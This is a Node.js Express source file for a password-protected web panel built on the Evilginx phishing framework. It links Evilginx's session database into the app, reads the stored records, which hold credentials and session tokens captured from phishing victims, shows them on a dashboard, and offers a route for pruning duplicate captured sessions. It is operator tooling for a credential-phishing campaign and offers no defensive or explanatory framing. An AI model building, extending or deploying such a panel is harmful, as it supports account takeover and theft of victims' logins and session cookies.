if (process.env.NODE_ENV !== 'production') {
    require('dotenv').config();
}

const express = require('express');
const path = require('path');
const fs = require('fs');
const passport = require('passport');
const bcrypt = require('bcrypt');
const flash = require('express-flash');
const session = require('express-session');
const morgan = require('morgan');
const chalk = require('chalk');
const { execSync } = require('child_process');

const app = express();
const users = require('./users');
const DB_PATH = path.join(__dirname, 'data.db');
const os = require('os'); // Import OS module for platform detection
const EVILGINX_DB = getEvilginxDBPath();
console.log(`✅ Evilginx DB Path: ${EVILGINX_DB}`);
app.set('views', path.join(__dirname, 'views'));
app.set('view-engine', 'ejs');
app.use(express.static(path.join(__dirname, 'public')));
app.use(morgan('dev'));
app.use(express.urlencoded({ extended: false }));
app.use(express.json());
app.use(flash());
app.use(session({
    secret: process.env.SESSION_SECRET,
    resave: false,
    saveUninitialized: false
}));
app.use(passport.initialize());
app.use(passport.session());

const initializePassport = require('./passport-config');
initializePassport(
    passport,
    name => users.find(user => user.name === name),
    id => users.find(user => user.id === id)
);

function getEvilginxDBPath() {
    const platform = os.platform(); // Get current OS platform

    if (platform === "win32") {
        return path.join(process.env.USERPROFILE || "C:\\Users\\Administrator", ".evilginx", "data.db");
    } else if (platform === "linux") {
        return path.join("/root", ".evilginx", "data.db");
    } else {
        console.error("❌ Unsupported OS detected.");
        process.exit(1); // Exit if OS is not supported
    }
}

function logMessage(type, message) {
    const time = new Date().toLocaleTimeString();
    const logTypes = {
        info: chalk.blue(`[INFO] ${time}`),
        success: chalk.green(`[SUCCESS] ${time}`),
        error: chalk.red(`[ERROR] ${time}`),
        warn: chalk.yellow(`[WARNING] ${time}`)
    };
    console.log(logTypes[type] || logTypes.info, message);
}

function updateDatabaseLink() {
    try {
        if (fs.existsSync(DB_PATH)) {
            fs.unlinkSync(DB_PATH);
            logMessage('warn', 'Deleted old database file.');
        }
        fs.symlinkSync(EVILGINX_DB, DB_PATH);
        logMessage('success', 'Database relinked successfully.');
    } catch (error) {
        logMessage('error', `Database linking failed: ${error}`);
    }
}

function readDatabase() {
    try {
        const fileContent = fs.readFileSync(DB_PATH, 'UTF-8');
        const lines = fileContent.split("\n");
        const sessionMap = {};

        lines.forEach(line => {
            if (line.includes("{") || line.includes('"custom":{')) {
                try {
                    let session = JSON.parse(line);
                    if (session.id) {
                        sessionMap[session.id] = session;
                    }
                } catch (err) {
                    logMessage('error', `Failed to parse session data: ${err}`);
                }
            }
        });

        return Object.values(sessionMap);
    } catch (err) {
        logMessage('error', `Error reading database: ${err}`);
        return [];
    }
}

updateDatabaseLink();

app.get('/', checkAuthenticated, async (req, res) => {
    updateDatabaseLink();
    const data = readDatabase();
    logMessage('info', `User ${req.user.name} accessed dashboard.`);
    res.render('index.ejs', { data: data });
});

app.get('/login', checkNotAuthenticated, (req, res) => {
    res.render('login.ejs');
});

app.post('/login', checkNotAuthenticated, passport.authenticate('local', {
    successRedirect: '/',
    failureRedirect: '/login',
    failureFlash: true
}), (req, res) => {
    updateDatabaseLink();
    logMessage('success', `User ${req.user.name} logged in.`);
});

app.post('/logout', checkAuthenticated, (req, res) => {
    req.logout(err => {
        if (err) {
            logMessage('error', `Logout failed: ${err}`);
            return res.redirect('/');
        }
        req.session.destroy(() => {
            res.clearCookie('connect.sid');
            logMessage('success', 'User logged out successfully.');
            res.redirect('/login');
        });
    });
});

app.post('/delete-duplicates', checkAuthenticated, (req, res) => {
    try {
        const fileContent = fs.readFileSync(DB_PATH, 'UTF-8');
        const lines = fileContent.split("\n");
        const sessionMap = {};

        lines.forEach(line => {
            if (line.includes("{") || line.includes('"custom":{')) {
                try {
                    let session = JSON.parse(line);
                    if (session.id) {
                        sessionMap[session.id] = session;
                    }
                } catch (err) {
                    logMessage('error', `Failed to parse session: ${err}`);
                }
            }
        });

        let updatedData = Object.values(sessionMap).map(session => JSON.stringify(session)).join("\n");
        fs.writeFileSync(DB_PATH, updatedData);
        logMessage('success', 'Duplicate sessions removed.');

        res.json({ message: "✅ Duplicates removed, latest sessions kept." });
    } catch (err) {
        logMessage('error', `Error deleting duplicates: ${err}`);
        res.status(500).json({ message: "❌ Failed to delete duplicates." });
    }
});

function checkAuthenticated(req, res, next) {
    if (req.isAuthenticated()) return next();
    logMessage('warn', 'Unauthorized access attempt.');
    res.redirect('/login');
}

function checkNotAuthenticated(req, res, next) {
    if (req.isAuthenticated()) return res.redirect('/');
    next();
}

logMessage('success', '🚀 Server Running');
app.listen(2850);
